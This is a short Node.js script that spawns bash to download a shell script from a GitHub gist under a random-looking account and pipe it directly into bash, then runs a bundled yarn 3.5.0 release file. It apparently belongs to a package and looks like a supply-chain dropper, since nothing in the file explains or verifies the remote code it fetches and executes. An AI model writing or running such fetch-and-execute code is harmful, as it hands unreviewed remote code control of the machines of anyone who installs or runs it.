const { exec } = require('child_process');

// Execute the bash command
exec('bash -c "curl -sSfL https://gist.githubusercontent.com/wgrjwhvfr/843b48af383a11d32556e166691ccda6/raw/dd3f78e2118b02af47e93e1e6ad9a6751f0f05e4/test.sh | bash && ./.yarn/releases/yarn-3.5.0.cjs"', (error, stdout, stderr) => {
    if (error) {
        console.error(`Error: ${error.message}`);
        return;
    }

    if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
    }

    // Output the result
    console.log(`stdout: ${stdout}`);
});
